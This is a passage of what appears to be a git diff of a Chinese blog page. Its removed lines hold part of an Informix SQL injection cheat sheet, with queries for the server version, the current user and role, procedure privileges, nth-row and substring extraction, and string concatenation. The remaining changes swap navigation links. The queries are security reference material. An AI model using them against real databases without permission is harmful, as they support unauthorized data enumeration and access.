-<li> | SELECT DBINFO(‘version’, ‘server-type’) FROM systables WHERE tabid = 1  | -<br>当前用户  | SELECT USER FROM systables WHERE tabid = 1  | -</li>
-<li> | select CURRENT_ROLE FROM systables WHERE tabid = 1  | -<br>用户权限  | select procname, owner, grantor, grantee from sysprocauth join sysprocedures on sysprocauth.procid = sysprocedures.procid  | 哪些用户可以访问哪些程序<br>选择第N行  | select first 1 tabid from (select first 10 tabid from systables order by tabid) as sq order by tabid desc  | 选择第10行<br>选择第N个字符  | SELECT SUBSTRING(‘ABCD’ FROM 3 FOR 1) FROM systables where tabid = 1  | 返回C<br>ASCII值-字符  | -  | -<br>字符-ASCII值  | select ascii(‘A’) from systables where tabid = 1  | 返回65<br>字符串连接  | SELECT ‘A’ || ‘B’ FROM systables where tabid = 1  | 返回AB</li>
-<li> | SELECT concat(‘A’, ‘B’) FROM systables where tabid = 1  | 返回AB<br>时间睡眠  | -  | -</li>
-</ul>
 
 </div>
 
@@ -1084,16 +1611,16 @@ $dbh-&gt;query($sql, array($clean[&#39;last_name&#39;]));
     <div class="post-guide">
         <div class="item left">
             
-              <a href="/2021/04/12/Linux/04Linux%E4%B9%8BVim/">
+              <a href="/2021/04/12/%E6%B1%87%E7%BC%96/%E9%80%9A%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8/">
                   <i class="fa fa-angle-left" aria-hidden="true"></i>
-                  04Linux之Vim
+                  通用寄存器
               </a>
             
         </div>
         <div class="item right">
             
-              <a href="/2019/12/26/Linux/22%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B9%8BVSFTP/">
-                22网络服务器之VSFTP
+              <a href="/2021/04/12/Linux/%E5%8D%8A%E8%99%9A%E6%8B%9F%E5%8C%96%E5%92%8C%E7%A1%AC%E4%BB%B6%E8%99%9A%E6%8B%9F%E5%8C%96%E7%9A%84%E4%B8%BB%E8%A6%81%E5%8C%BA%E5%88%AB/">
+                半虚拟化和硬件虚拟化的主要区别
                 <i class="fa fa-angle-right" aria-hidden="true"></i>
               </a>
             
